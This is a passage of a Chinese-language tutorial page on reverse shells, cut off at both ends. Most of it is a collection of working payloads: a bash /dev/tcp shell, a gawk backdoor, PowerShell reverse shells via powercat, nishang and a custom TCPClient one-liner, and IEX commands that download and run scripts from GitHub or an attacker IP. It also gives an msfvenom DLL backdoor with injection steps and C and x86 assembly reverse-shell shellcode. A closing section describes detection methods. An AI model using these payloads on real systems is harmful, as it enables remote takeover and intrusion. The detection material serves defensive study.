class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>]</span> as String<span class="hljs-selector-attr">[]</span>)<br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.waitFor</span>()<br></code></pre></td></tr></table></figure><h3 id="8-gawk"><a href="#8-gawk" class="headerlink" title="8. gawk"></a>8. gawk</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/gawk -f</span><br><br>BEGIN &#123;<br>       <span class="hljs-built_in"> Port </span>   =       8080<br>        Prompt  =       <span class="hljs-string">&quot;bkd&gt; &quot;</span><br><br>       <span class="hljs-built_in"> Service </span>= <span class="hljs-string">&quot;/inet/tcp/&quot;</span><span class="hljs-built_in"> Port </span><span class="hljs-string">&quot;/0/0&quot;</span><br>        <span class="hljs-keyword">while</span> (1) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                        printf Prompt |&amp;<span class="hljs-built_in"> Service</span><br><span class="hljs-built_in"></span>                       <span class="hljs-built_in"> Service </span>|&amp; getline cmd<br>                        <span class="hljs-keyword">if</span> (cmd) &#123;<br>                                <span class="hljs-keyword">while</span> ((cmd |&amp; getline) &gt; 0)<br>                                        <span class="hljs-built_in">print</span> <span class="hljs-variable">$0</span> |&amp;<span class="hljs-built_in"> Service</span><br><span class="hljs-built_in"></span>                                close(cmd)<br>                        &#125;<br>                &#125; <span class="hljs-keyword">while</span> (cmd != <span class="hljs-string">&quot;exit&quot;</span>)<br>                close(Service)<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-powershell反弹shell"><a href="#9-powershell反弹shell" class="headerlink" title="9. powershell反弹shell"></a>9. powershell反弹shell</h3><p>powershell反弹shell本质上是一些多功能代码集合，通过调用windows提供的api接口实现网络通信和指令解析执行的功能。</p><h4 id="1）powercat反弹shell"><a href="#1）powercat反弹shell" class="headerlink" title="1）powercat反弹shell"></a>1）powercat反弹shell</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 攻击者(192.168.159.134)开启监听：</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">6666</span><br><span class="hljs-comment"># 或者使用powercat监听</span><br>powercat -l -p <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 目标机反弹cmd shell：</span><br>powershell IEX (New-Object System.Net.Webclient).DownloadString<br>(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);<br><span class="hljs-attribute">powercat</span> -c <span class="hljs-number">192.168.159.134</span> -p <span class="hljs-number">6666</span> -e cmd<br></code></pre></td></tr></table></figure><h4 id="2）nishang反弹shell"><a href="#2）nishang反弹shell" class="headerlink" title="2）nishang反弹shell"></a>2）nishang反弹shell</h4><p>Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMP等类型shell。</p><p><strong>## Reverse TCP shell</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 攻击者(192.168.159.134)开启监听：</span><br>nc <span class="hljs-literal">-lvp</span> <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 目标机执行：</span><br>powershell <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com</span><br><span class="hljs-string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<br><span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span> <span class="hljs-literal">-port</span> <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 或者将nishang下载到攻击者本地：</span><br>powershell <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-PowerShellTcp</span> <span class="hljs-literal">-Reverse</span> <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span> <span class="hljs-literal">-port</span> <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><p><strong>## Reverse UDP shell</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 攻击者(192.168.159.134)开启监听：</span><br><span class="hljs-attribute">nc</span> -lvup <span class="hljs-number">53</span><br><br><span class="hljs-comment"># 目标机执行：</span><br><span class="hljs-attribute">powershell</span> IEX (New-Object Net.WebClient).DownloadString(&#x27;http://<span class="hljs-number">192.168.159.134</span>/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;);<br><span class="hljs-attribute">Invoke</span>-PowerShellUdp -Reverse -IPAddress <span class="hljs-number">192.168.159.134</span> -port <span class="hljs-number">53</span><br></code></pre></td></tr></table></figure><p><strong>## Reverse ICMP shell</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 首先攻击端下载icmpsh_m.py文件</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/inquisb/i</span>cmpsh)和nishang中的Invoke-PowerShellIcmp.ps1<br><br><span class="hljs-comment"># 攻击者(192.168.159.134)执行</span><br>sysctl -w net.ipv4.icmp_echo_ignore_all=<span class="hljs-number">1</span> <span class="hljs-comment">#忽略所有icmp包</span><br>python icmpsh_m.py <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">159.138</span> <span class="hljs-comment">#开启监听</span><br><br><span class="hljs-comment"># 目标机(192.168.159.138)执行</span><br>powershell IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#x27;</span>);Invoke-PowerShellIcmp -IPAddress <span class="hljs-number">192.168</span>.<span class="hljs-number">159.134</span><br></code></pre></td></tr></table></figure><h4 id="3）自定义powershell函数反弹shell"><a href="#3）自定义powershell函数反弹shell" class="headerlink" title="3）自定义powershell函数反弹shell"></a>3）自定义powershell函数反弹shell</h4><p>利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp shell。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># 攻击者(192.168.159.134) 开启监听 </span><br>nc -lvp <span class="hljs-number">6666</span><br><br><span class="hljs-comment"># 目标机执行 </span><br>powershell -nop -c <span class="hljs-string">&quot;$client = New-Object Net.Sockets.TCPClient(&#x27;192.168.159.134&#x27;,6666);$stream = $client.GetStream();</span><br><span class="hljs-string">[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;</span><br><span class="hljs-string">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );</span><br><span class="hljs-string">$sendback2 = $sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</span><br><span class="hljs-string">$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></code></pre></td></tr></table></figure><h4 id="4）Empire-结合office反弹shell"><a href="#4）Empire-结合office反弹shell" class="headerlink" title="4）Empire 结合office反弹shell"></a>4）Empire 结合office反弹shell</h4><p>Empire(<a href="https://github.com/EmpireProject/Empire)%E5%9F%BA%E4%BA%8Epowershell%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%8F%AF%E5%88%A9%E7%94%A8office%E5%AE%8F%E3%80%81OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E3%80%81HTML%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F(HTAs)%E7%AD%89%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E3%80%82">https://github.com/EmpireProject/Empire)基于powershell的后渗透攻击框架，可利用office宏、OLE对象插入批处理文件、HTML应用程序(HTAs)等进行反弹shell。</a></p><ul><li>利用office宏反弹shell </li><li>利用office OLE对象插入bat文件反弹shell</li></ul><h3 id="10-regsvr32反弹shell"><a href="#10-regsvr32反弹shell" class="headerlink" title="10. regsvr32反弹shell"></a>10. regsvr32反弹shell</h3><h2 id="0x5：msf生成payload反弹shell"><a href="#0x5：msf生成payload反弹shell" class="headerlink" title="0x5：msf生成payload反弹shell"></a>0x5：msf生成payload反弹shell</h2><h3 id="1-生成脚本解释型代码并执行"><a href="#1-生成脚本解释型代码并执行" class="headerlink" title="1. 生成脚本解释型代码并执行"></a>1. 生成脚本解释型代码并执行</h3><p>本质上就是在目标机器执行了一段Python代码，和上一章节的python反弹shell没有本质区别。</p><h3 id="2-生成编译型二进制文件并执行"><a href="#2-生成编译型二进制文件并执行" class="headerlink" title="2. 生成编译型二进制文件并执行"></a>2. 生成编译型二进制文件并执行</h3><p>本质上就是在目标机器执行了一个二进制程序。</p><h3 id="3-内存shellcode执行"><a href="#3-内存shellcode执行" class="headerlink" title="3. 内存shellcode执行"></a>3. 内存shellcode执行</h3><p>通过shellcode直接调用glibc或者syscall完成反弹shell。 </p><h4 id="1）C代码"><a href="#1）C代码" class="headerlink" title="1）C代码"></a>1）C代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/socket.h&gt;</span>   <span class="hljs-comment">//构造socket所需的库</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;netinet/in.h&gt;</span>  <span class="hljs-comment">//定义sockaddr结构</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *shell[<span class="hljs-number">2</span>];       <span class="hljs-comment">//用于execv调用</span><br>  <span class="hljs-type">int</span> soc,remote;    <span class="hljs-comment">//文件描述符句柄</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> serv_addr; <span class="hljs-comment">//保存IP/端口值的结构</span><br> <br>  serv_addr.sin_addr.s_addr=<span class="hljs-number">0x6400A8C0</span>;  <span class="hljs-comment">//将socket的地址设置为所有本地地址</span><br>  serv_addr.sin_port=<span class="hljs-number">0xBBBB</span>;  <span class="hljs-comment">//设置socket的端口48059</span><br>  serv_addr.sin_family=<span class="hljs-number">2</span>;   <span class="hljs-comment">//设置协议族：IP</span><br>  soc=<span class="hljs-built_in">socket</span>(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br>  remote=<span class="hljs-built_in">connect</span>(soc,(<span class="hljs-keyword">struct</span> sockaddr *)&amp;serv_addr,<span class="hljs-number">0x10</span>);<br> <br>  <span class="hljs-built_in">dup2</span>(soc,<span class="hljs-number">0</span>);   <span class="hljs-comment">//将stdin连接client</span><br>  <span class="hljs-built_in">dup2</span>(soc,<span class="hljs-number">1</span>);   <span class="hljs-comment">//将stdout连接client</span><br>  <span class="hljs-built_in">dup2</span>(soc,<span class="hljs-number">2</span>);   <span class="hljs-comment">//将strderr连接到client</span><br>  shell[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;/bin/sh&quot;</span>;   <span class="hljs-comment">//execve的第一个参数</span><br>  shell[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;           <span class="hljs-comment">//数组的第二个元素为NULL,表示数组结束</span><br>  <span class="hljs-built_in">execv</span>(shell[<span class="hljs-number">0</span>],shell,<span class="hljs-literal">NULL</span>);   <span class="hljs-comment">//建立一个shell</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2）汇编语言代码"><a href="#2）汇编语言代码" class="headerlink" title="2）汇编语言代码"></a>2）汇编语言代码</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">section</span> .text<br><span class="hljs-meta">global</span> _start<br><span class="hljs-symbol">_start:</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span> <span class="hljs-comment">;清空eax</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">ebx</span> <span class="hljs-comment">;清空ebx</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">edx</span>  <span class="hljs-comment">;清空edx</span><br> <br><span class="hljs-comment">;soc=socket(2,1,0)</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>  <span class="hljs-comment">;socket的第三个参数：0</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">byte</span> <span class="hljs-number">0x1</span> <span class="hljs-comment">;socket的第二个参数：1</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">byte</span> <span class="hljs-number">0x2</span> <span class="hljs-comment">;socket的第一个参数：2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span> <span class="hljs-comment">;将数组的地址设置为socketcall的第二个参数</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">bl</span>  <span class="hljs-comment">;将socketcall的第一个参数设置为1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">102</span>  <span class="hljs-comment">;调用socketcall,分支调用号为1：SYS_SOCKET</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进入核心态，执行系统调用</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esi</span>,<span class="hljs-built_in">eax</span> <span class="hljs-comment">;将返回值(eax)存储到esi中（即soc句柄）</span><br> <br><span class="hljs-comment">;remote=connect(soc,(struct sockaddr *)&amp;serv_addr,0x10)</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><span class="hljs-comment">; ;仍然为0，用来作为接下来压栈的数据的结束符</span><br><span class="hljs-keyword">push</span> long <span class="hljs-number">0x6400A8C0</span>  <span class="hljs-comment">;本节代码中新增，将地址反序得到的十六进制压栈</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">word</span> <span class="hljs-number">0xBBBB</span>  <span class="hljs-comment">;将端口压栈，十进制为48059</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span> <span class="hljs-comment">;清空ecx，以便保存结构的sa_family字段</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cl</span>,<span class="hljs-number">2</span>  <span class="hljs-comment">;将ecx的地位字节，设置为2</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">word</span> <span class="hljs-built_in">cx</span>  <span class="hljs-comment">;建立结构，包括端口和sin.family,共四个字节</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span> <span class="hljs-comment">;将结构的地址（在栈上）复制到ecx</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">byte</span> <span class="hljs-number">0x10</span>  <span class="hljs-comment">;connect参数的开始，将16压栈</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>  <span class="hljs-comment">;在栈上保存结构的地址</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">esi</span>  <span class="hljs-comment">;将服务器文件描述符esi保存到栈</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span> <span class="hljs-comment">;将参数数组的地址保存到ecx（socketcall的第二个参数）</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bl</span>,<span class="hljs-number">3</span>  <span class="hljs-comment">;将bl设置为3，socketcall的第一个参数</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">102</span>  <span class="hljs-comment">;调用socketcall，分支调用号为3：SYS_CONNECT</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进入核心态，执行系统调用</span><br> <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esi</span> <span class="hljs-comment">;将客户端的soc文件描述符复制到ebx</span><br><span class="hljs-comment">;dup2(soc,0)</span><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">ecx</span> <span class="hljs-comment">;清空ecx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">63</span> <span class="hljs-comment">;将系统调用的第一个参数设置为63：dup</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进行系统调用</span><br> <br><span class="hljs-comment">;dup2(client,1)</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span> <span class="hljs-comment">;ecx设置为1</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">63</span> <span class="hljs-comment">;准备进行系统调用:dup2:63</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span>  <span class="hljs-comment">;进行系统调用</span><br> <br><span class="hljs-comment">;dup2(client,2)</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">ecx</span> <span class="hljs-comment">;ecx设置为2</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">63</span> <span class="hljs-comment">;准备进行系统调用:dup2:63</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span> <span class="hljs-comment">;进行系统调用</span><br> <br><span class="hljs-comment">;标准的execv(&quot;/bin/sh&quot;...</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">push</span> long <span class="hljs-number">0x68732f2f</span><br><span class="hljs-keyword">push</span> long <span class="hljs-number">0x6e69622f</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebx</span>,<span class="hljs-built_in">esp</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-keyword">push</span> <span class="hljs-built_in">ebx</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">esp</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">al</span>,<span class="hljs-number">0x0b</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">0x80</span><br></code></pre></td></tr></table></figure><p>注意，push long 0x6400A8C0 这里就是IP地址，出现了00，在网络传输中会被截断。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">nasm -f elf reverse_port_asm.asm<br><span class="hljs-keyword">ld</span> -o reverse_port_asm reverse_port_asm.o<br><span class="hljs-meta"># 然后抽取十六进制代码</span><br>objdump -d ./reverse_port_asm<br><span class="hljs-meta"># 得到shellcode </span><br></code></pre></td></tr></table></figure><h3 id="4-通过dll进程注入执行反弹shell"><a href="#4-通过dll进程注入执行反弹shell" class="headerlink" title="4. 通过dll进程注入执行反弹shell"></a>4. 通过dll进程注入执行反弹shell</h3><p>PowerSploit是又一款基于powershell的后渗透攻击框架。PowerSploit包括Inject-Dll(注入dll到指定进程)、Inject-Shellcode（注入shellcode到执行进程）等功能。<br>利用msfvenom、metasploit和PowerSploit中的Invoke-DllInjection.ps1 实现dll注入，反弹shell、</p><ul><li>msfvenom生成dll后门：msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.159.134 lport&#x3D;6667 -f dll -o &#x2F;var&#x2F;www&#x2F;html&#x2F;PowerSploit&#x2F;lltest.dll</li><li>metasploit设置payload开启监听</li><li>powershell下载PowerSploit中Invoke-DllInjection.ps1和msfvenom生成的dll后门：IEX (New-Object Net.WebClient).DownloadString(“<a href="http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)Invoke-DllInjection">http://192.168.159.134/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;)Invoke-DllInjection</a> -ProcessID 5816 -Dll C:UsersAdministratorDesktoplltest.dll</li></ul><p>本质上，dll进程注入和上一节介绍的shellcode执行的原理的是一样的。</p><h2 id="0x6：dns-shell-amp-icmp-shell"><a href="#0x6：dns-shell-amp-icmp-shell" class="headerlink" title="0x6：dns_shell &amp; icmp_shell"></a>0x6：dns_shell &amp; icmp_shell</h2><p>本质上说，dns和icmp是一种网络通信方式，使用任何语言都可以借助这两种网络通信方式进行反弹shell交互。</p><p>但是我们知道，dns和icmp和tcp&#x2F;udp不一样，它们都不是直连的网络信道，而是需要通过一个第三方进行消息中转。</p><ul><li>dns（udp直连模式）<ul><li>control server将指令封装成dns包格式，通过udp53直接发送给client</li><li>victim client从udp53接收到dns包后进行解析，从中提取并解码得到指令，并将执行结果封装成dns包格式，通过udp53返回给server</li></ul></li><li>dns（authoritative DNS server转发模式）<ul><li>victim client配置好dns resolve（domain nameserver），之后将所有的执行结果和指令请求都以正常dns query的形式发送给local DNS server，随后通过dns递归查询最终会发送到攻击者控制的domain nameserver上</li><li>control server从dns query中过滤出反弹shell相关的会话通信，并按照dns response的形式返回主控指令。</li></ul></li></ul><h1 id="5-反弹Shell检测思路"><a href="#5-反弹Shell检测思路" class="headerlink" title="5. 反弹Shell检测思路"></a>5. 反弹Shell检测思路</h1><h2 id="1-进程-file-descriptor-异常检测"><a href="#1-进程-file-descriptor-异常检测" class="headerlink" title="1.进程 file descriptor 异常检测"></a>1.进程 file descriptor 异常检测</h2><h3 id="1-1-检测-file-descriptor-是否指向一个socket"><a href="#1-1-检测-file-descriptor-是否指向一个socket" class="headerlink" title="1.1 检测 file descriptor 是否指向一个socket"></a>1.1 检测 file descriptor 是否指向一个socket</h3><p>以“重定向符”+”&#x2F;dev&#x2F;tcp网络通信”Bash反弹Shell这一类最经典的反弹Shell攻击方式为例，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个socket句柄</strong>。</p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104034125-1531808234.png" alt="img"></p><p> <img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215104112969-1097291178.png" alt="img"> </p><h3 id="1-2-检测-file-descriptor-是否指向一个管道符（pipe）"><a href="#1-2-检测-file-descriptor-是否指向一个管道符（pipe）" class="headerlink" title="1.2 检测 file descriptor 是否指向一个管道符（pipe）"></a>1.2 检测 file descriptor 是否指向一个管道符（pipe）</h3><p>对于利用“管道符”传递指令的反弹shell攻击方式来说，这类反弹shell的本质可以归纳为<strong>file descriptor的重定向到一个pipe句柄</strong>。</p><p><img src="https://img2018.cnblogs.com/blog/532548/201912/532548-20191215105358151-246000034.png" alt="img"></p><p>更进一步地说，不管做了多少层的pipe，反弹shell的本质是将server的输入传递给client的bash，因此肯定存在socket连接。</p><p>我们只需要根据pid追溯pipe上游的进程，并判断其进程fd，检查是否是来自一个socket。</p><p>例如，跟踪pipe，发现pipe的进程建立了socket连接，那么就存在反弹shell的风险。 </p><h2 id="2-netlink监控-fd异常检测"><a href="#2-netlink监控-fd异常检测" class="headerlink" title="2.netlink监控+fd异常检测"></a>2.netlink监控+fd异常检测</h2><ul><li>监听Netlink Socket，实时获取进程EXEC事件。</li><li>如果为Shell进程，检查进程启动打开的FD，<ul><li>打开了Socket</li><li>未使用&#x2F;dev&#x2F;tty、&#x2F;dev&#x2F;pts&#x2F;n、&#x2F;dev&#x2F;ptmx等终端</li><li>则确认为反弹Shell</li></ul></li></ul><p><strong>绕过风险：仅能通过进程执行文件名判断是否为Shell进程，上传可执行文件、拷贝Bash文件到其他路径等方法会绕过这个方法</strong>。</p><p>例如通过将&#x2F;bin&#x2F;sh重命名为其他名字进行反弹shell。</p><h2 id="3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测"><a href="#3-脚本文件-amp-amp-应用程序-amp-amp-无文件（fileless）反弹shell检测" class="headerlink" title="3.脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测"></a>3.脚本文件 &amp;&amp; 应用程序 &amp;&amp; 无文件（fileless）反弹shell检测</h2><p>需要注意的是，操作系统是分层的，Bash只是一个应用程序的普通应用，其内部封装了调用glibc execve的功能而已，除了bash之外，白帽子还可以基于任意的应用层技术来实现反弹shell，例如：</p><ul><li>python&#x2F;perl实现纯代码形式的反弹shell文件执行：文件脚本检测</li><li>python&#x2F;perl实现纯代码形式的反弹shell命令行指令（fileless）：纯命令行fileless检测</li><li>C&#x2F;C++实现纯代码形式的反弹shell：二进制文件检测</li></ul><h2 id="4-特征检测"><a href="#4-特征检测" class="headerlink" title="4. 特征检测"></a>4. 特征检测</h2><h4 id="4-1网络层反弹shell通信特征检测"><a href="#4-1网络层反弹shell通信特征检测" class="headerlink" title="4.1网络层反弹shell通信特征检测"></a>4.1网络层反弹shell通信特征检测</h4><p>反弹shell的通信会话中，会包含一些”cmdline shell特征“，例如”#root….“等，可以在网络侧进行NTA实时检测。</p><h4 id="4-2DNS反弹shell特征检测"><a href="#4-2DNS反弹shell特征检测" class="headerlink" title="4.2DNS反弹shell特征检测"></a>4.2DNS反弹shell特征检测</h4><p>针对DNS流量进行分析，判断关联进程是否开启&#x2F;dev&#x2F;net&#x2F;tun，或者&#x2F;dev&#x2F;net&#x2F;tap隧道等等。</p><h4 id="4-3-ICMP反弹shell特征检测"><a href="#4-3-ICMP反弹shell特征检测" class="headerlink" title="4.3 